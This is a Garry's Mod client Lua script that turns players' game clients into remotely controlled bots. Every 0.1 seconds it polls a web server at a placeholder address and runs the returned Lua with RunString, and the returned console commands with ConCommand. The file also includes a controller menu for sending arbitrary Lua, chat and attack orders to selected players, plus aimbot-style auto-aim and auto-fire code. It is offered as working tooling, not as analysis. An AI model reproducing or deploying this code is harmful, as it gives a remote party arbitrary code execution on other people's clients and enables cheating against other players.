
if CLIENT then

local attackqueue = {}
IsShiftDown = false
bottasks = {}
botcache = {
	botfriendlies = {},
	botstatus = {}
	botconfig = {
		webserverippath = "http://yourip/botphpthing.php"
	}
}
queuetasks = {}
selectedplayer = {}
function StoreInfoForPlayer(info, playername)
    http.Post( botcache.botconfig.webserverippath, { request = "send", name = playername, info = util.TableToJSON(info) })
end

function ReadInfoAboutMyself()
    local cool = http.Post( botcache.botconfig.webserverippath, { request = "request", name = LocalPlayer():SteamID64(), info = 1 }, function( result )
	    if result then  
            local totab = table.Copy(util.JSONToTable(result))
            if totab then
                local removething = {}
                if totab.luacommand then
                	for k, v in pairs(  totab.luacommand  ) do	
                		RunString( v )

                	end
                end

	    	    bottasks = totab

	    	    if bottasks.consolecommand then
	    	    	for k5, v5 in pairs( bottasks.consolecommand ) do 
	    	    		LocalPlayer():ConCommand( v5 )

	    	    	end
	    	    end              
	    	end
	    end
    end )
end
function AddFriendlyPlayer(ply)

    table.insert(botcache.botfriendlies, ply)
    DebugMessage("Status Player: "..ply)

end
function ResetFriendlies()
    botcache.botfriendlies = {}

end
function SendUnitLua(luacom, ply)
 	if !istable(queuetasks[ply:SteamID64()]) then
		queuetasks[ply:SteamID64()] = {}	    
	end
	if istable(queuetasks[ply:SteamID64()].luacommand) then
		table.insert(queuetasks[ply:SteamID64()].luacommand, luacom)
	else
		queuetasks[ply:SteamID64()].luacommand = {luacom}
			
	end   


end
function GoToPosition(vec)
	for _, ent in pairs(  selectedplayer  ) do	   
 	    if !istable(queuetasks[ent:SteamID64()]) then
		    queuetasks[ent:SteamID64()] = {}	    
	    end
	    if istable(queuetasks[ent:SteamID64()].positionqueue) then
		    table.insert(queuetasks[ent:SteamID64()].positionqueue, {vec.x, vec.y, vec.z})
	    else
	  	    queuetasks[ent:SteamID64()].positionqueue = {{vec.x, vec.y, vec.z}}
			
	    end       
	
    end
end
function SelectUnit(pos, ang)
	local tr = util.TraceLine( {
	    start = pos,
	    endpos = pos + ang:Forward() * 10000,
	    filter = function( ent ) if ( ent:IsPlayer() ) then return true end end
    } )
    if tr.Entity:IsPlayer() then
    	if table.HasValue(selectedplayer, tr.Entity) then
    		table.RemoveByValue(selectedplayer,tr.Entity)

    	else
    		table.insert(selectedplayer,tr.Entity)
       
        end

    end


end

function ToggleStatus(status)
	for k, v in pairs(  botcache.botstatus  ) do	
	    if v == status then

	    	table.remove(botcache.botstatus, k)
	    	DebugMessage("Status Removed: "..status)
	    	return
	    end 
	end
	table.insert(botcache.botstatus, status)
	DebugMessage("Status Added: "..status)

end

function DealWithUnit(ent)
	for _, ent2 in pairs(  selectedplayer  ) do	
        
		if queuetasks[ent2:SteamID64()] then
			table.insert(queuetasks[ent2:SteamID64()].attackqueue, ent:SteamID64())

		    
		else
			queuetasks[ent2:SteamID64()] = {}
			queuetasks[ent2:SteamID64()].attackqueue = {ent:SteamID64()}
			
		end
    end	

end
function SendConsoleCommand(command, ply)
 	if !istable(queuetasks[ply:SteamID64()]) then
		queuetasks[ply:SteamID64()] = {}	    
	end
	if istable(queuetasks[ply:SteamID64()].consolecommand) then
		table.insert(queuetasks[ply:SteamID64()].consolecommand, command)
	else
		queuetasks[ply:SteamID64()].consolecommand = {command}
			
	end   


end
function FindPlayerByName(name)
	for k, v in pairs(  player.GetAll()  ) do
		if v:SteamID64() == name then
				      
			return v
		end
	end
		        

end
function EquipWeaponByClass(class)
    local guns = LocalPlayer():GetWeapons()
    if guns then
        for k, v in pairs(  guns  ) do
        	if v:GetClass() == class then
        		input.SelectWeapon( v )
        	end

        end
        
    end
end
function DebugMessage(message)
	RunConsoleCommand("say", message)
end
function InstructUnit(pos, ang)
	local tr = util.TraceLine( {
	    start = pos,
	    endpos = pos + ang:Forward() * 10000,
	    filter = function( ent ) if ( ent:IsPlayer() ) then return true end end
    } )
    if tr.Entity then
    	if tr.Entity:IsPlayer() or tr.Entity:IsNPC() then
    		
            DealWithUnit(tr.Entity)
    		return false

    	end
    	
    
   
    	
    end
    
    GoToPosition(tr.HitPos)

    
    

end
function Openmen(ent)

    local Menu = DermaMenu()
    Menu:Open( gui.MouseX(), gui.MouseY())


    local btnWithIcon = Menu:AddOption( "Toggle Crouch", function() 
    	SendUnitLua('ToggleStatus("STATUS_CROUCH")', ent)
    end )
    btnWithIcon:SetIcon( "icon16/user_go.png" )

    local btnWithIcon4 = Menu:AddOption( "Toggle Turret Mode", function() 
    	SendUnitLua('ToggleStatus("STATUS_TURRET")', ent)
    end )
    btnWithIcon4:SetIcon( "icon16/user_go.png" )	


    local btnWithIcon2 = Menu:AddOption( "Type To Chat", function() 
       Derma_StringRequest(
	        "Type to Chat",
	        "This will send a chat message to the player.",
	        "",
	        function( text )
	        	SendConsoleCommand('say "'..text..'"', ent)
	        end        
        )   	


    end )
    btnWithIcon2:SetIcon( "icon16/textfield_add.png" )

    local btnWithIcon3 = Menu:AddOption( "Send Lua Command", function() 
       Derma_StringRequest(
	        "Send Lua",
	        "This will send a lua command to the player.",
	        "",
	        function( text )
	        	SendUnitLua(text, ent)
	        end        
        )   	


    end )
    btnWithIcon3:SetIcon( "icon16/application_xp_terminal.png" )

    local Child, Parent = Menu:AddSubMenu( "Select Weapon" )
    Parent:SetIcon( "icon16/find.png" )
    local guns = ent:GetWeapons()
    if guns then
        for k, v in pairs(  guns  ) do
        	Child:AddOption( v:GetPrintName(), function()
        		SendUnitLua('EquipWeaponByClass("'..v:GetClass()..'")', ent)
        		
        		

        	end ):SetIcon( "icon16/bomb.png" )
        end
    end

    local Child2, Parent2 = Menu:AddSubMenu( "Make Player Friendly" )
    Parent2:SetIcon( "icon16/heart.png" )
    local players = player.GetAll()
    if players then
        for k, v in pairs(  players  ) do
        	Child2:AddOption( v:Name(), function()
       
        		SendUnitLua('AddFriendlyPlayer("'..v:SteamID64()..'")', ent)

        		
        		
        		

        	end ):SetIcon( "icon16/heart_add.png" )
        end
    end
   Menu:Open()
end
local matOutline = CreateMaterial( "BlackOutline", "UnlitGeneric", { [ "$basetexture" ] = "vgui/black" } )



hook.Add( "PostDrawOpaqueRenderables", "Stencil Tutorial Example", function()

	render.SetStencilReferenceValue( 0 )
	-- render.SetStencilCompareFunction( STENCIL_ALWAYS )
	render.SetStencilPassOperation( STENCIL_KEEP )
	-- render.SetStencilFailOperation( STENCIL_KEEP )
	render.SetStencilZFailOperation( STENCIL_KEEP )
	render.ClearStencil()

	-- Enable stencils
	render.SetStencilEnable( true )
	-- Force everything to fail
	render.SetStencilCompareFunction( STENCIL_NEVER )
	-- Save all the things we don't draw
	render.SetStencilFailOperation( STENCIL_REPLACE )

	-- Set the reference value to 00011100
	render.SetStencilReferenceValue( 0x1C )
	-- Set the write mask to 01010101
	-- Any writes to the stencil buffer will be bitwise ANDed with this mask.
	-- With our current reference value, the result will be 00010100.
	render.SetStencilWriteMask( 0x55 )

	-- Fail to draw our entities.
	for _, ent in pairs(  selectedplayer  ) do
		ent:DrawModel()
	end

	-- Set the test mask to 11110011.
	-- Any time a pixel is read out of the stencil buffer it will be bitwise ANDed with this mask.
	render.SetStencilTestMask( 0xF3 )
	-- Set the reference value to 00011100 & 01010101 & 11110011
	render.SetStencilReferenceValue( 0x10 )
	-- Pass if the masked buffer value matches the unmasked reference value
	render.SetStencilCompareFunction( STENCIL_EQUAL )

	-- Draw our entities
	render.ClearBuffersObeyStencil( 255, 255, 255, 255, false );

	-- Let everything render normally again
	render.SetStencilEnable( false )
	for k, v in pairs(  queuetasks  ) do
		local entpos = Vector(0,0,0)
		local lastposition = Vector(0,0,0)
		for k3, v3 in pairs(  player.GetAll()  ) do
			if v3:SteamID64() == k then
				lastposition = v3:GetPos()
				entpos = v3:GetPos()
			end

		end
	    if IsShiftDown then

		    if v.positionqueue then
			    for k2, v2 in pairs(  v.positionqueue  ) do
		            render.DrawLine( lastposition, Vector(v2[1],v2[2],v2[3]), Color( 255, 255, 255 ) )

		            lastposition = Vector(v2[1],v2[2],v2[3])
		        end
		    end

		
	    end
	    if v.attackqueue  then
		    for k4, v4 in pairs(  v.attackqueue  ) do
		        for k5, v5 in pairs(  player.GetAll()  ) do
			        if v5:Name() == v4 then
				        

				        render.DrawLine( entpos, v5:GetPos(), Color( 255, 0, 0 ) )
			        end

		        end
		        
		    end
	    end
    end




end )



if ( timer.Exists( "BotCheckTimer" ) ) then timer.Remove("BotCheckTimer") end
if ( timer.Exists( "TaskQueue" ) ) then timer.Remove("TaskQueue") end
timer.Simple( 1, function() 

	ReadInfoAboutMyself() 

    timer.Create( "BotCheckTimer", 0.1, 0, function() 
        ReadInfoAboutMyself() 
        if bottasks then

        	if bottasks.positionqueue then
                pos = bottasks.positionqueue
            
            end

        end
    end )  
end )
timer.Create( "TaskQueue", 0.1, 0, function() 
    if !IsShiftDown then 
        if !table.IsEmpty(queuetasks) then
    	    for k, v in pairs( queuetasks ) do
      
    		    StoreInfoForPlayer(v, k)

    	    end
    	
    	    queuetasks = {}
        end
    end
       
end ) 



local time = 10

hook.Add( "StartCommand", "StartCommandExample", function( ply,cmd ) 

	    if botcache.botstatus then
	    	if table.HasValue(botcache.botstatus, "STATUS_CROUCH") then
	    		cmd:SetButtons( IN_DUCK )
	    	end
	    	if table.HasValue(botcache.botstatus, "STATUS_TURRET") then

	    		local timeDelta = (CurTime() % time) / time

	    		cmd:SetViewAngles( Angle(0,timeDelta*360,0) )
                local hostiles = false
	    		for k, v in pairs(player.GetAll()) do
	    			if v != LocalPlayer() and v:Alive() and !table.HasValue(botcache.botfriendlies, v:SteamID64()) then
	    			    local tr = util.TraceLine( {
	                        start = LocalPlayer():EyePos(),
	                        endpos = v:EyePos(),
	                    
                        } )
                  

                        if tr.HitPos == v:EyePos() then

                            local vec1 = v:EyePos()
                            local vec2 = ply:GetShootPos()
                            local ang = ( vec1 - vec2 ):Angle() 

                        	cmd:SetViewAngles( ang )
                        	cmd:SetButtons( IN_ATTACK )

                    	    return 
                        end
                    end
	    		end
	    		return
	    	end    	
	    end
        if bottasks.attackqueue then
        	for k, v in pairs( bottasks.attackqueue ) do
        		local ent = FindPlayerByName(v)
                local vec1 = ent:EyePos()
                local vec2 = ply:GetShootPos()
                local ang = ( vec1 - vec2 ):Angle() 

                if ent:Alive() then

 
                    cmd:SetViewAngles( ang ) 

                    cmd:SetButtons( IN_ATTACK )
                end
        	end
        end
        if pos[1] then  
        	
	        cmd:SetForwardMove( ply:GetRunSpeed() )

            local vec1 = Vector(pos[1][1],pos[1][2],pos[1][3])
            local vec2 = ply:GetShootPos()
            local ang = ( vec1 - vec2 ):Angle() 
            ang.pitch = 0
            cmd:SetViewAngles( ang ) 

        	

            local pos1 = LocalPlayer():GetPos()
            pos1.z = 0
            local pos2 = Vector(pos[1][1],pos[1][2],pos[1][3])
            pos2.z = 0
	    
            if pos1:Distance(pos2) < 64 then
    	        table.remove(pos, 1)
            end
            return
        end
      



end )
NoclipPos = LocalPlayer():EyePos()
MouseAngs = Angle(0,0,0)
IsNoclipEnabled = false
local delay = 0
hook.Add( "PlayerButtonDown", "keypressbind", function( ply, key )
	if ( key == KEY_F ) then
		if CurTime() > delay then
			IsNoclipEnabled = !IsNoclipEnabled
			delay = CurTime() + 0.3
			NoclipPos = LocalPlayer():EyePos()


		end

	elseif (key == KEY_B) then
		if CurTime() > delay then
		    IsShiftDown = !IsShiftDown
		    delay = CurTime() + 0.3
		end
    elseif (key == MOUSE_MIDDLE) then
    	if IsNoclipEnabled then
	        local tr = util.TraceLine( {
	            start = NoclipPos,
	            endpos = NoclipPos + MouseAngs:Forward() * 10000,
	            filter = function( ent ) if ( ent:IsPlayer() ) then return true end end
            } )
            if tr.Entity:IsPlayer() then
            	Openmen(tr.Entity)
            	
            end
            
    		
    	end
    	
	end
end )

hook.Add( "HUDPaint", "HUDPaint_DrawABox", function()
	draw.SimpleText( "Queue Mode: "..tostring(IsShiftDown), "DermaDefault", 20, 20, color_white )

    draw.SimpleText( table.ToString( selectedplayer, "Selected Players: ", true ), "DermaDefault", 20, 35, color_white )
    if IsNoclipEnabled then 
        for k3, v3 in pairs(  player.GetAll()  ) do

        end
    end

end )

hook.Add( "PlayerBindPress", "PlayerBindPressExample", function( ply, bind, pressed )

	if IsNoclipEnabled then 
		if bind == "+attack" then
			if pressed then
				surface.PlaySound( "buttons/blip1.wav" )
			    SelectUnit(NoclipPos, MouseAngs)
			    return true
			end
	    elseif bind == "+attack2" then
			if pressed then
                surface.PlaySound( "player/footsteps/tile1.wav" )
			    InstructUnit(NoclipPos, MouseAngs)
			    return true
			end	   	
		end

	end
end )

hook.Add( "CalcView", "Cams", function(ply, Pos, Ang, FOV)
    if IsNoclipEnabled then             
        local CamData = {}
                       
        local Speed = 100/5
        MouseAngs = Angle( NoclipY, NoclipX, 0 )
        if LocalPlayer():KeyDown(IN_SPEED) then
            Speed = Speed * 5
        end
        if LocalPlayer():KeyDown(IN_FORWARD) then
            NoclipPos = NoclipPos+(MouseAngs:Forward()*Speed)
        end
        if LocalPlayer():KeyDown(IN_BACK) then
            NoclipPos = NoclipPos-(MouseAngs:Forward()*Speed)
        end
        if LocalPlayer():KeyDown(IN_MOVELEFT) then
            NoclipPos = NoclipPos-(MouseAngs:Right()*Speed)
        end
        if LocalPlayer():KeyDown(IN_MOVERIGHT) then
            NoclipPos = NoclipPos+(MouseAngs:Right()*Speed)
        end
        if NoclipJump then
            NoclipPos = NoclipPos+Vector(0,0,Speed)
        end
        if NoclipDuck then
            NoclipPos = NoclipPos-Vector(0,0,Speed)
        end
        CamData.origin = NoclipPos
        CamData.angles = MouseAngs
        CamData.fov = FOV
        CamData.drawviewer = true

                       
        return CamData
    end      
end)

hook.Add( "CreateMove", "Bhop", function(ucmd)

               
    if IsNoclipEnabled then                
        NoclipAngles = ucmd:GetViewAngles()
        NoclipY, NoclipX = ucmd:GetViewAngles().x, ucmd:GetViewAngles().y
        NoclipOn = true
                      
        ucmd:ClearMovement()
        if ucmd:KeyDown(IN_JUMP) then
            ucmd:RemoveKey(IN_JUMP)
            NoclipJump = true
        elseif NoclipJump then
            NoclipJump = false
        end
        if ucmd:KeyDown(IN_DUCK) then
            ucmd:RemoveKey(IN_DUCK)
            NoclipDuck = true
        elseif NoclipDuck then
            NoclipDuck = false
        end
        NoclipX = NoclipX-(ucmd:GetMouseX()/50)
        if NoclipY+(ucmd:GetMouseY()/50) > 89 then NoclipY = 89 elseif NoclipY+(ucmd:GetMouseY()/50) < -89 then NoclipY = -89 else NoclipY = NoclipY+(ucmd:GetMouseY()/50) end
        ucmd:SetViewAngles(NoclipAngles)

        return false
    end


end)

end